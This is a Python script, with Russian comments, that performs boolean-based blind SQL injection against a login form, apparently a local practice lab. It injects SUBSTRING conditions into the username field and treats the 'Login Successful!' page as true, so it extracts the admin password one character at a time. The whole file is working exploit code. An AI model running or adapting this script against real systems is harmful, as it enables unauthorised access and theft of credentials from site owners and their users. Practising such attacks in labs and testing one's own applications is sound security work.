#!/usr/bin/env python3
import requests
import string

BASE_URL = "http://localhost:8082/blind/login"
TARGET_USER = "admin"

session = requests.Session()


def check_condition(position, char):
    # Инъекция в username:
    # admin' AND SUBSTRING(password,1,1)='a'--
    inj_username = f"{TARGET_USER}' AND SUBSTRING(password,{position},1)='{char}'--"

    data = {
        "username": inj_username,
        "password": "anything",
    }

    resp = session.post(BASE_URL, data=data, allow_redirects=True)

    # Для отладки можно включить:
    # print(position, char, resp.status_code, len(resp.text))

    # "Истина": вернулся HTML с заголовком Login Successful!
    return resp.status_code == 200 and "Login Successful!" in resp.text


def extract_password(max_len=32):
    charset = string.ascii_letters + string.digits + "_-!@#"
    guessed = ""
    for pos in range(1, max_len + 1):
        found = False
        for ch in charset:
            if check_condition(pos, ch):
                guessed += ch
                print(f"[+] Position {pos}: {ch}")
                found = True
                break
        if not found:
            break
    return guessed


if __name__ == "__main__":
    print("[*] Extracting admin password using boolean-based blind SQLi")
    pwd = extract_password()
    print(f"[+] Recovered password: {pwd}")